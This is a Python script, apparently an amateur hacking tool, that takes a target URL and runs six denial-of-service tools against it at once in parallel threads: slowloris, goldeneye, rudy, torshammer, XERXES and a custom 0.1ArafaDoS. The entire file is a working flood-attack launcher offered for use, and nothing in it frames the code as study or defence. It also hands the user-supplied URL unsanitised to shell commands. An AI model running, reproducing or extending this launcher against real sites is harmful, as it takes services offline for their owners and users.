#!/usr/bin/python3

from os import system
from sys import argv
from threading import Thread
from termcolor import cprint
from requests import post
from time import sleep

def banner():
	system("clear"),cprint(r"""
	    _.---.,_       ,-----.--.  ,---.                    ,---.          _,---.   ,---.
	  .'  - , `.-,    /` ` - /==/.--.'  \      .-.,.---.  .--.'  \      .-`.' ,  \.--.'  \
	 / -  ,  ,_\==\   `-'-. -|==|\==\-/\ \    /==/  `   \ \==\-/\ \    /==/_  _.-'\==\-/\ \
	|     .=.   |==|      | `|==|/==/-|_\ |  |==|-, .=., |/==/-|_\ |  /==/-  '..-./==/-|_\ |
	| -  :=; : _|==|      | -|==|\==\,   - \ |==|   '='  /\==\,   - \ |==|_ ,    /\==\,   - \
	|     `=` , |==|      | `|==|/==/ -   ,| |==|- ,   .' /==/ -   ,| |==|   .--' /==/ -   ,|
	 \ _,    - /==/.=.  .-','|==/==/-  /\ - \|==|_  . ,'./==/-  /\ - \|==|-  |   /==/-  /\ - \
	  `.   - .`=.`:=; :/     \==\==\ _.\=\.-'/==/  /\ ,  )==\ _.\=\.-'/==/   \   \==\ _.\=\.-'
	    ``--'--'   `=` `-----`---`--`        `--`-`--`--' `--`        `--`---'    `--`
	   ,---.                                         _,.---._      ,-,--.
	 .--.'  \       _.-.      _.-.     _,..---._   ,-.' , -  `.  ,-.'-  _\
	 \==\-/\ \    .-,.'|    .-,.'|   /==/,   -  \ /==/_,  ,  - \/==/_ ,_.'
	 /==/-|_\ |  |==|, |   |==|, |   |==|   _   _\==|   .=.     \==\  \
	 \==\,   - \ |==|- |   |==|- |   |==|  .=.   |==|_ : ;=:  - |\==\ -\
	 /==/ -   ,| |==|, |   |==|, |   |==|,|   | -|==| , '='     |_\==\ ,\
	/==/-  /\ - \|==|- `-._|==|- `-._|==|  '='   /\==\ -    ,_ //==/\/ _ |
	\==\ _.\=\.-'/==/ - , ,/==/ - , ,/==|-,   _`/  '.='. -   .' \==\ - , /
	 `--`        `--`-----'`--`-----'`-.`.____.'     `--`--''    `--`---'
												By: Abd Almoen Arafa (0.1Arafa)
												My Age is: 15
												This tool made in 2022
			Best six DoS attack tools around the world are here
	""","grey",attrs=["bold"])

def First_Packet():
	try:	post(argv[1])
	except:	print("\033[00m\033[91m[-] Error, Bad URL or check your Internet Connection\033[00m"),quit()

def ArafaDoS():
	cprint("[+] Starting 0.1ArafaDoS...","magenta"),sleep(1),system(f"python3 0.1ArafaDoS/0.1ArafaDoS.py {argv[1]}")

def slowloris():
	cprint("[+] Starting slowloris...","magenta"),sleep(2),system(f"slowloris {argv[1]}")

def goldeneye():
	cprint("[+] Starting goldeneye...","magenta"),sleep(2),system(f"goldeneye {argv[1]}")

def torshammer():
	cprint("[+] Starting torshammer...","magenta"),sleep(3),system(f'python2 torshammer/torshammer.py -t {argv[1].replace("https://","").replace("http://","")}')

def XERXES():
	cprint("[+] Starting XERXES in 100 seconds...","magenta"),sleep(100),system(f'./XERXES/xerxes {argv[1].replace("https://","").replace("http://","")} 80')

def rudy():
	cprint("[+] Starting rudy...","magenta"),sleep(2),system(f'rudy -t {argv[1]}')

def Main():
	ArafaDoS_thread=Thread(target=ArafaDoS)
	slowloris_thread=Thread(target=slowloris)
	goldeneye_thread=Thread(target=goldeneye)
	rudy_thread=Thread(target=rudy)
	torshammer_thread=Thread(target=torshammer)
	XERXES_thread=Thread(target=XERXES)

	ArafaDoS_thread.start()
	slowloris_thread.start()
	goldeneye_thread.start()
	rudy_thread.start()
	torshammer_thread.start()
	XERXES_thread.start()

if __name__ == "__main__":
	if len(argv) == 2:	First_Packet(),banner(),Main()
	else:	cprint("Usage: python3 "+argv[0]+" <Target_URL>\nExample: python3 "+argv[0]+" http://example.com ","white",attrs=["bold"])

